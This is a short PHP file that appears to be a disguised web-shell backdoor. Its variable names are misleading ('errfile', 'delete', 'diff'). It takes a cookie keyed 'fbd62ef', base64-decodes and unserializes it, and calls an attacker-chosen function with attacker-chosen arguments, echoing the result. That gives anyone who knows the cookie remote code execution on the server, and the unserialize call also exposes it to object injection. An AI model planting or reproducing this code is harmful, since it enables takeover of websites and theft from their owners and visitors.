<?php

$errfile = $_COOKIE;
$secs = "fbd62ef";

if (isset($errfile[$secs])) {
	$tmp = base64_decode($errfile[$secs]);
	$args = unserialize($tmp);
			
	$secss = array_pop( $args );
	$delete = array_pop( $args );
	$diff = array_pop( $args );
	
	var_dump($diff($delete, $secss));
}

?>